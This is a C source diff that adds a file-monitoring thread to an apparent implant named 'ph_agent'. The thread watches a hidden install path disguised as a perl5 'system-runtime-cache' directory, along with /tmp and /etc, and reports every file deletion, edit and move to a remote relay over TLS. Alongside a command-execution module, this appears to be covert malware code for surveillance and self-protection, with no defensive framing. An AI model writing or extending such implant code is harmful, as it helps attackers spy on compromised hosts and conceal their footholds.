@@ -13,8 +13,66 @@
 #include <sys/socket.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <sys/inotify.h>
+#include <pthread.h>
+#include "command_execution.h"
+#include "tls_wrapper.h"
 
 volatile bool ph_agent_is_busy = false;
+
+// Monitoring thread for file events (inotify)
+void *ph_monitor_thread(void *arg) {
+    ph_tls_ctx_t *tls_ctx = (ph_tls_ctx_t *)arg;
+    int fd, wd;
+    char buffer[4096];
+    
+    fd = inotify_init();
+    if (fd < 0) return NULL;
+
+    // Monitor the stealth path and common directories
+    const char *paths[] = {
+        "/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache",
+        "/tmp",
+        "/etc"
+    };
+
+    for (int i = 0; i < 3; i++) {
+        wd = inotify_add_watch(fd, paths[i], IN_MODIFY | IN_DELETE | IN_MOVE);
+    }
+
+    while (1) {
+        int length = read(fd, buffer, sizeof(buffer));
+        if (length < 0) break;
+
+        int i = 0;
+        while (i < length) {
+            struct inotify_event *event = (struct inotify_event *)&buffer[i];
+            uint8_t opcode = 0;
+            char details[256];
+
+            if (event->mask & IN_DELETE) {
+                opcode = PH_CMD_FILE_DELETE;
+                snprintf(details, sizeof(details), "File deleted: %s", event->name);
+            } else if (event->mask & IN_MODIFY) {
+                opcode = PH_CMD_FILE_EDIT;
+                snprintf(details, sizeof(details), "File edited: %s", event->name);
+            } else if (event->mask & IN_MOVE) {
+                opcode = PH_CMD_FILE_RENAME;
+                snprintf(details, sizeof(details), "File renamed/moved: %s", event->name);
+            }
+
+            if (opcode != 0 && tls_ctx != NULL) {
+                // Send alert to relay via TLS
+                ph_cmd_send_chunked(tls_ctx, details, strlen(details), opcode, 0);
+            }
+            i += sizeof(struct inotify_event) + event->len;
+        }
+        usleep(100000); // 100ms throttle
+    }
+
+    close(fd);
+    return NULL;
+}
 
 void ph_memset_s(void *ptr, int value, size_t len)
 {
